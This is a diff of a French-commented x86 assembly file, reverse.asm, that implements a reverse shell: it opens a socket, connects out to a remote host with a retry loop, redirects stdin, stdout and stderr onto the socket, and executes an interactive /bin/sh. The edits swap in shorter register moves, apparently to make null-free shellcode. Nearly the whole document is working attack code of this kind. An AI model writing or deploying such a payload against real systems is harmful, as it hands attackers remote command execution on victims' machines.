@@ -1,19 +1,19 @@
 ;Pour compiler : nasm -f elf32 -g reverse.asm && ld -m elf_i386 reverse.o
 global _start
 section .data
-    SHELL       dw      "/bin/bash", 0
+    SHELL       dw      "/bin/sh", 0
     arg1        dw      "-i", 0
-    env         dw      "PS1=",34,"\e[0",59,"31m[\u@\h \W]\$ \e[m",34, 0
+    ;env         dw      "PS1=",34,"\e[0",59,"31m[\u@\h \W]\$ \e[m",34, 0
+    env         dw      "PS1=Ceci est mon prompt#",0
     parsearg    dd      SHELL, arg1, 0
-    perseenv    dd      env, 0 
+    perseenv    dd      env, 0
 section .text
 _start:
-
 ; Creation du socket
 
-        mov eax, 0x66    ;syscall eax en hex
+        mov al, 0x66    ;syscall eax en hex
 
-        mov ebx, 0x1     ;SYS_CREATE
+        mov bl, 0x1     ;SYS_CREATE
 
         ;Structure de la variable du 3 eme parametre a mettre en haut de la stack
         push 0x0        ; Protocol IP
@@ -28,7 +28,7 @@ _start:
 
 _connect_socket:
 
-        mov eax, 0x66   ;Meme appel system que en haut
+        mov al, 0x66   ;Meme appel system que en haut
 
         mov ebx, 0x3    ;SYS_CONNECT
         ;Structure de connect()
@@ -48,7 +48,7 @@ _connect_socket:
         mov ecx, esp
         int 0x80
         ;test de la valeur de retour
-        cmp eax, 0x0
+        cmp al, 0x0
         jne _sleep	;fonction dodo de 5 seconde
         jmp _dup
 
@@ -58,26 +58,26 @@ _sleep:
         push 0x5		;seconde
         mov ebx,esp
         int 0x80
-        jmp     _connect_socket ;re-tentative de connecter le socket
+        jmp _connect_socket ;re-tentative de connecter le socket
 
 _dup:
 
-        mov eax, 0x3f	;dup2 syscall
+        mov al, 0x3f	;dup2 syscall
         mov ebx, edx	;file descriptor dans ebx
         xor ecx, ecx	;0 pour STDIN
         int 0x80
 
-        mov eax, 0x3f	;dup2 syscall
-        mov ecx, 0x1	;1 pour STDOUT
+        mov al, 0x3f	;dup2 syscall
+        mov cl, 0x1	;1 pour STDOUT
         int 0x80
 
-        mov eax, 0x3f	;dup2 syscall
-        mov ecx, 0x2	;2 pour STDERR	 
+        mov al, 0x3f	;dup2 syscall
+        mov cl, 0x2	;2 pour STDERR
         int 0x80
         jmp _exe_bin
 
 _exe_bin:
-        mov eax, 0xb ;exeve syscall
+        mov al, 0xb ;exeve syscall
         ; int execve(const char *pathname, char *const argv[], char *const envp[]);
         mov ebx, SHELL
         mov ecx, parsearg
